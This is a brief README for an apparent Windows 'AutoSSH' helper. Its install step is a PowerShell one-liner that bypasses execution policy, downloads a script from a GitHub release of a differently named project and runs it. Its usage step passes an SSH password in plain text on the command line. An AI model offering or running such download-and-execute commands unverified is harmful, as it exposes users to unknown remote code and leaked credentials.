# AutoSSH

## Install
Open a terminal and run :
```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://github.com/prankapple/RunWithPower3.0/releases/download/RunWithPower3.0/RunWithPower3.0-Installer.ps1' -OutFile install.ps1; .\install.ps1"
```
close the shell.

## Usage
Open CMD and run (replace **myuser**, **192.168.0.2** and **supersecretpassword**):
```bash
autossh -user myuser -host 192.168.0.2 -password supersecretpassword
```
It will open another shell and will SSH into it auto.
